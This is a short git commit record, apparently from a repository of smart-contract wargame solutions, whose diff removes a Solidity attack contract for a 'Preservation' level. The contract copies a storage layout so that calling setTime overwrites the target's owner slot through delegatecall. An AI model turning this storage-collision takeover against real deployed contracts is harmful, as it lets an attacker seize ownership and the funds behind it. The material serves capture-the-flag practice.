a88efe1e155396b9f991d74c73dd8856f718bb5d
djynx <21341344+djynx@users.noreply.github.com>
2025-05-26 01:40:17 +0300

    Added several solutions

--- contracts/script/attacks/16_PreservationAttack.sol
+++
@@ -1,9 +0,0 @@
-contract PoopyLibrary {
-    address public dead;
-    address public beef;
-    address public owner;
-
-    function setTime(uint256 _time) public {
-        owner = address(uint160(_time));
-    }
-}
